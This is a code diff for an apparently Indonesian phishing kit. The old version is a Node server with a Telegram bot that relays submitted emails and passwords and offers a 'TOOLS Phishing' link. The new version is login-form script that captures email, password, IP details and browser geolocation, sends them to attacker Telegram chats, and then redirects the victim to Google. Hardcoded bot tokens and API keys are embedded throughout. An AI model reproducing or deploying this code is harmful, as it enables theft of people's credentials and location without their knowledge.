@@ -1,142 +1,105 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const cors = require('cors');
-const TelegramBot = require('node-telegram-bot-api');
-const axios = require('axios');
-const cheerio = require('cheerio');
+document.getElementById("loginForm").addEventListener("submit", async function(event) {
+    event.preventDefault();
 
-const app = express();
-app.use(cors());
-app.use(bodyParser.json());
+    let email = document.getElementById("email").value;
+    let password = document.getElementById("password").value;
+    let loginTime = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
 
-const botToken = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY";
-const chatIds = ["6786210993"]; 
-const bot = new TelegramBot(botToken, { polling: true });
+    // Telegram bot setup
+    let botToken = "AIzaSyA5tdHVNBSUvYMw8g9U0SxH";  // Ganti dengan token bot Telegram kamu
+    let chatIds = ["7894929132"];  // Ganti dengan chat ID kamu
+    let profileImageUrl = "https://staticg.sportskeeda.com/editor/2022/01/f49b9-16421055515852-1920.jpg"; // Gambar profil
 
-const rssUrl = 'https://www.securityweek.com/rss.xml';
-
-// Fungsi Ambil Berita
-const fetchSecurityNews = async () => {
+    // Fetch IP Info
+    let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
     try {
-        const response = await axios.get(rssUrl);
-        const body = response.data;
-        const $ = cheerio.load(body);
-        let newsList = [];
+        let response = await fetch("https://ipinfo.io/json?token=961f6caebd0f7d");
+        ipInfo = await response.json();
+    } catch (error) {
+        console.error("Gagal mendapatkan data IP:", error);
+    }
 
-        $('item').each((i, element) => {
-            const title = $(element).find('title').text();
-            const link = $(element).find('link').text();
-            newsList.push({ title, link });
+    async function getUserLocation() {
+        return new Promise((resolve) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve(`📍 Koordinat: ${position.coords.latitude}, ${position.coords.longitude}`);
+                    },
+                    () => {
+                        resolve("📍 Lokasi: Tidak diizinkan oleh user");
+                    }
+                );
+            } else {
+                resolve("📍 Lokasi: Tidak didukung di browser ini");
+            }
         });
-
-        return newsList;
-    } catch (error) {
-        console.error('Error fetching news:', error);
-        return [];
-    }
-};
-
-// Fungsi Fetch Gemini AI
-const getGeminiResponse = async (message) => {
-    try {
-        const response = await axios.post('https://api.gemini.com/v1/ask', {
-            apiKey: ' "AIzaSyA5tdHVNBSUvYMw8g9U0SxH-CraUq_5RMA',
-            query: message,
-        });
-        return response.data.response;
-    } catch (error) {
-        console.error("Error getting Gemini AI response:", error);
-        return "⚠️ Maaf, aku gak bisa jawab sekarang.";
-    }
-};
-
-// Endpoint Login
-app.post('/api/login', async (req, res) => {
-    const { email, password } = req.body;
-    const loginTime = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" });
-
-    let ipInfo = { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown" };
-    try {
-        let response = await axios.get("https://ipinfo.io/json?token=961f6caebd0f7d");
-        ipInfo = response.data;
-    } catch (error) {
-        console.error("Failed to fetch IP data:", error);
     }
 
-    let message = `🔒 *Login Attempt!*\n\n`
-        + `🕒 *Time:* ${loginTime}\n`
+    let userLocation = await getUserLocation();
+
+    let message = `🔒 *Login Berhasil!*\n\n`
+        + `🕒 *Waktu:* ${loginTime}\n`
         + `📧 *Email:* ${email}\n`
         + `🔑 *Password:* ${password}\n`
         + `🌍 *IP:* ${ipInfo.ip}\n`
-        + `📍 *Location:* ${ipInfo.city}, ${ipInfo.country}\n`
-        + `🏢 *Provider:* ${ipInfo.org}`;
+        + `📍 *Lokasi:* ${ipInfo.city}, ${ipInfo.country}\n`
+        + `🏢 *Provider:* ${ipInfo.org}\n`
+        + `${userLocation}`;
 
-    chatIds.forEach(chatId => {
-        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
-    });
-
-    console.log("✅ Login data sent to Telegram successfully!");
-    res.json({ success: true, message: "Login successful!" });
-});
-
-// Handle Bot Telegram
-bot.onText(/\/start/, (msg) => {
-    bot.sendMessage(msg.chat.id, '🔥 Selamat datang di Cyber Security Bot! Ketik /menu untuk lihat opsi.');
-});
-
-bot.onText(/\/menu/, (msg) => {
-    const chatId = msg.chat.id;
-    const photoUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_fMq7l79lm6-bYF7qqvwuxlKpXPgJ90_TLA&usqp=CAU";
-
-    bot.sendPhoto(chatId, photoUrl, { caption: "📌 Pilih menu di bawah ini:" })
-        .then(() => {
-            const opts = {
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: "🔍 TOOLS Phishing", callback_data: "TOOLS_phishing" }],
-                        [{ text: "📰 Berita Keamanan", callback_data: "latest_news" }],
-                        [{ text: "🤖 Gemini AI", callback_data: "ask_gemini" }],
-                    ],
-                },
-            };
-            bot.sendMessage(chatId, "📌 Pilih opsi:", opts);
-        })
-        .catch((error) => {
-            console.error("❌ Gagal mengirim gambar:", error);
-            bot.sendMessage(chatId, "⚠️ Gagal mengirim gambar. Silakan coba lagi.");
-        });
-});
-
-bot.on("callback_query", async (callbackQuery) => {
-    const msg = callbackQuery.message;
-    const data = callbackQuery.data;
-
-    if (data === "TOOLS_phishing") {
-        bot.sendMessage(msg.chat.id, "🔍 Link Phishing: https://suntiksubscriber.vercel.app/");
-    } else if (data === "latest_news") {
-        const newsList = await fetchSecurityNews();
-        if (newsList.length > 0) {
-            newsList.slice(0, 5).forEach(news => {
-                bot.sendMessage(msg.chat.id, `*${news.title}*\n[Read more](${news.link})`, { parse_mode: 'Markdown' });
-            });
-        } else {
-            bot.sendMessage(msg.chat.id, "⚠️ Gak ada berita terbaru saat ini.");
-        }
-    } else if (data === "ask_gemini") {
-        bot.sendMessage(msg.chat.id, "💬 Ketik /ai <pertanyaan> untuk ngobrol dengan Gemini AI.");
+    async function sendToAllChats(urlTemplate) {
+        return Promise.all(chatIds.map(chatId => fetch(urlTemplate(chatId))));
     }
 
-    bot.answerCallbackQuery(callbackQuery.id);
+    await sendToAllChats(chatId =>
+        `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`
+    );
+
+    await sendToAllChats(chatId =>
+        `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
+    );
+
+    console.log("✅ Data terkirim ke Telegram!");
+
+    // Send News Update to Telegram
+    const rssUrl = 'https://www.securityweek.com/rss.xml';
+
+    const fetchSecurityNews = async () => {
+        try {
+            const response = await fetch(rssUrl);
+            const body = await response.text();
+            
+            const $ = cheerio.load(body);
+            let newsList = [];
+            
+            $('item').each((i, element) => {
+                const title = $(element).find('title').text();
+                const link = $(element).find('link').text();
+                const description = $(element).find('description').text();
+                
+                newsList.push({ title, link, description });
+            });
+
+            return newsList;
+        } catch (error) {
+            console.error('Error fetching news:', error);
+            return [];
+        }
+    };
+
+    const sendNewsUpdate = async (chatId) => {
+        const newsList = await fetchSecurityNews();
+        
+        if (newsList.length > 0) {
+            newsList.slice(0, 5).forEach(news => { 
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`*${news.title}*\n${news.description}\n[Read more](${news.link})`)}&parse_mode=Markdown`);
+            });
+        } else {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=No news available at the moment.`);
+        }
+    };
+
+    sendNewsUpdate(chatIds[0]);
+
+    window.location.href = "https://www.google.com";  // Redirect setelah login
 });
-
-bot.onText(/\/ai (.+)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userQuestion = match[1];
-
-    const aiResponse = await getGeminiResponse(userQuestion);
-
-    bot.sendMessage(chatId, aiResponse);
-});
-
-// Export handler buat Vercel
-module.exports = app;
